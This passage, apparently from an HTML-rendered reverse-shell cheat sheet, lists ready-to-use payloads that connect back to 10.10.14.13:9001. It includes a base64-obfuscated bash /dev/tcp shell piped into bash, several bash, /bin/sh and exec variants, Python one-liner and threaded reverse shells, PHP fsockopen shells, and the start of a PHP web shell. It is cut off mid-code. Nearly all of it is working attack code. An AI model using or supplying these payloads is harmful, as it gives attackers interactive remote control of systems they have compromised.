encoded\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy85MDAxIDA+JjE\u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e base64 -d \u003cspan class=\"p\"\u003e|\u003c/span\u003e bash\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"bash-variations\"\u003eBash Variations\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Using exec\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexec\u003c/span\u003e 5\u0026lt;\u0026gt;/dev/tcp/10.10.14.13/9001\u003cspan class=\"p\"\u003e;\u003c/span\u003ecat \u0026lt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"m\"\u003e5\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"nb\"\u003eread\u003c/span\u003e line\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003edo\u003c/span\u003e \u003cspan class=\"nv\"\u003e$line\u003c/span\u003e 2\u0026gt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"m\"\u003e5\u003c/span\u003e \u0026gt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e5\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Using /bin/sh\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/bin/sh -i \u0026gt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e /dev/tcp/10.10.14.13/9001 0\u0026gt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# With specific shell path\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/usr/bin/bash -i \u0026gt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e /dev/tcp/10.10.14.13/9001 0\u0026gt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"python-reverse-shells\"\u003ePython Reverse Shells\u003c/h2\u003e\n\u003ch3 id=\"python-2--3-compatible\"\u003ePython 2 \u0026amp; 3 Compatible\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Standard Python reverse shell\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003epython\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003ec\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.10.14.13\u0026#34;,9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Python with pty spawn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003epython\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003ec\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.10.14.13\u0026#34;,9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn(\u0026#34;/bin/sh\u0026#34;);\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Python3 specific\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003epython3\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003ec\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.10.14.13\u0026#34;,9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"python-pty-shell\"\u003ePython PTY Shell\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Interactive shell with PTY\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003epython\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003ec\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003epython3\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003ec\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Local Python PTY spawn (after getting basic shell)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"n\"\u003eusr\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"n\"\u003elocal\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nb\"\u003ebin\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"n\"\u003epython3\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003ec\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;import pty; pty.spawn(\u0026#34;/bin/sh\u0026#34;)\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"advanced-python-shell\"\u003eAdvanced Python Shell\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Multi-line Python reverse shell\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003esocket\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"nn\"\u003esubprocess\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"nn\"\u003eos\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"nn\"\u003ethreading\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"nn\"\u003esys\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003es2p\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"kc\"\u003eTrue\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003edata\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003erecv\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1024\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"nb\"\u003elen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"n\"\u003ep\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003estdin\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ewrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"n\"\u003ep\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003estdin\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eflush\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003ep2s\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"kc\"\u003eTrue\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ep\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003estdout\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eread\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003es\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003esocket\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esocket\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003esocket\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eAF_INET\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003esocket\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eSOCK_STREAM\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003econnect\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;10.10.14.13\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e9001\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003ep\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003esubprocess\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ePopen\u003c/span\u003e\u003cspan class=\"p\"\u003e([\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;/bin/sh\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"n\"\u003estdout\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003esubprocess\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ePIPE\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003estderr\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003esubprocess\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eSTDOUT\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003estdin\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003esubprocess\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ePIPE\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003es2p_thread\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ethreading\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eThread\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etarget\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003es2p\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eargs\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003ep2s_thread\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ethreading\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eThread\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etarget\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003ep2s\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eargs\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003es2p_thread\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003edaemon\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kc\"\u003eTrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003ep2s_thread\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003edaemon\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kc\"\u003eTrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003es2p_thread\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003estart\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003ep2s_thread\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003estart\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003etry\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003ep\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ewait\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eexcept\u003c/span\u003e \u003cspan class=\"ne\"\u003eKeyboardInterrupt\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eclose\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"php-reverse-shells\"\u003ePHP Reverse Shells\u003c/h2\u003e\n\u003ch3 id=\"basic-php\"\u003eBasic PHP\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-php\" data-lang=\"php\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Simple PHP reverse shell\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"nx\"\u003ephp\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"nx\"\u003er\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;$sock=fsockopen(\u0026#34;10.10.14.13\u0026#34;,9001);exec(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;);\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# PHP with error handling\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"nx\"\u003ephp\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"nx\"\u003er\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;$sock=fsockopen(\u0026#34;10.10.14.13\u0026#34;,9001);if($sock){$proc=proc_open(\u0026#34;/bin/sh -i\u0026#34;, array(0=\u0026gt;$sock, 1=\u0026gt;$sock, 2=\u0026gt;$sock),$pipes);}\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"web-based-php-shell\"\u003eWeb-based PHP Shell\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-php\" data-lang=\"php\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e\u0026lt;?\u003c/span\u003e\u003cspan class=\"nx\"\u003ephp\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003eset_time_limit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$ip\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;10.10.14.13\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$port\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e9001\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$chunk_size\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e1400\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$write_a\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$error_a\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$shell\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;uname -a; w; id; /bin/sh -i\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$daemon\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$debug\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003efunction_exists\u003c/span\u003e\u003cspan 